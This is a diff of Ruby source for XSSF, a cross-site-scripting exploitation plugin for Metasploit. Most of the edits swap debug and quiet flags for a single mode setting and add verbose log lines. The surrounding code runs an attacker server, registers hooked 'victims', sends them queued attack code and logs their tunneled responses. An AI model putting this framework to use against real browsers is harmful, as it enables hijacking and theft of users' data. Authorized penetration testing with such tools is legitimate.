@@ -47,7 +47,7 @@ module Msf
 				begin
 					self.attacker_srv  = WEBrick::HTTPServer.new(
 						:BindAddress 		=> XSSF_PUBLIC[0] ? '0.0.0.0' : '127.0.0.1',
-						:Port				=> port + 1,
+						:Port				=> port.to_i + 1,
 						:Logger				=> WEBrick::Log.new($stdout, WEBrick::Log::FATAL),
 						:ServerSoftware 	=> "XSSF " + XSSF_VERSION,
 						:ServerType 		=> Thread,
@@ -61,8 +61,8 @@ module Msf
 
 					self.attacker_srv.start
 				rescue
-					print_error("Error starting attackers' server : #{$!}.")
-					print_error("XSSF Tunnel and GUI pages won't be available.\n")
+					print_error("Error starting attacker' server : #{$!}.")			if (XSSF_MODE[0] =~ /^Debug$/i)
+					print_error("XSSF Tunnel and GUI pages won't be available.\n")	if (XSSF_MODE[0] =~ /^Debug$/i)
 				end
 				
 				return true
@@ -96,7 +96,7 @@ module Msf
 					end
 				rescue
 					XSSF_404(res) 
-					print_error("Error 27: #{$!}") if XSSF_DEBUG_MODE[0]
+					print_error("Error 27: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
 				end
 			end
 			
@@ -115,7 +115,7 @@ module Msf
 					end
 				rescue
 					XSSF_404(res) 
-					print_error("Error 0: #{$!}") if XSSF_DEBUG_MODE[0]
+					print_error("Error 0: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
 				end
 			end
 
@@ -137,7 +137,7 @@ module Msf
 						if (id)
 							# If auto attacks are running for this new victim, then we add first one to the victim
 							add_auto_attacks(id)
-
+							print_good("New victim registered with id: #{id.to_s}") if (XSSF_MODE[0] =~ /^Verbose$/i)
 							XSSF_RESP(res, loop_page(id, req.host) + xssf_post(id, req.host), 200, "OK", {	
 																						'Content-Type' 					=> 'application/javascript', 
 																						'P3P' 							=> 'CP="HONK IDC DSP COR CURa ADMa OUR IND PHY ONL COM STA"', 			# Don't know how P3P works (Compact Cookies Policy for IE / Safari), but it works !
@@ -153,7 +153,7 @@ module Msf
 								
 							if (attack = get_first_attack(id))								# If an attack is waiting for current victim (attacks are done in priority, then tunnel)
 								if (http_request_module(res, attack[0], req, id))
-									puts ""; 			print_good("Code '#{attack[1]}' sent to victim '#{id}'") if not XSSF_QUIET_MODE[0]
+									puts ""; 			print_good("Code '#{attack[1]}' sent to victim '#{id}'") if not (XSSF_MODE[0] =~ /^Quiet$/i)
 									attacked_victims; 	create_log(id, "Attack '#{attack[1]}' launched at url '#{attack[0]}'", nil) 
 								end
 							else
@@ -229,7 +229,7 @@ module Msf
 									TUNNEL.delete(tunnelid) if ((TUNNEL[tunnelid][1].to_s).size > 10000000) 	# Deleting if more than 10Mo of data	
 								}
 
-								print_good("ADDING RESPONSE IN TUNNEL (#{tunnelid.to_s})") if not XSSF_QUIET_MODE[0]
+								print_good("ADDING RESPONSE IN TUNNEL (#{tunnelid.to_s})") if not (XSSF_MODE[0] =~ /^Quiet$/i)
 								XSSF_RESP(res)
 							else
 								XSSF_404(res)
@@ -238,6 +238,8 @@ module Msf
 							file_id = Rex::Text.rand_text_alphanumeric(rand(20) + 10)
 							File.open(INCLUDED_FILES + XSSF_LOG_FILES + file_id.to_s + ".html", 'wb') {|f| f.write((response =~ /__________(.*)__________/) ? URI.unescape(Base64.decode64($1)) : URI.unescape(response)) }
 							create_log(id, file_id.to_s + ".html", URI.unescape(mod_name).strip)
+							print_good("Response received from victim '#{id.to_s}' from module '#{URI.unescape(mod_name).strip}'") if not (XSSF_MODE[0] =~ /^Quiet$/i)
+							puts "#{(response =~ /__________(.*)__________/) ? URI.unescape(Base64.decode64($1)) : URI.unescape(response)}" if (XSSF_MODE[0] =~ /^Verbose$/i)
 							XSSF_RESP(res)
 						end
 						
@@ -383,7 +385,7 @@ module Msf
 					client.close
 					return resp
 				rescue
-					print_error("Error 1: #{$!}") if XSSF_DEBUG_MODE[0]
+					print_error("Error 1: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
 					return nil
 				end
 			end
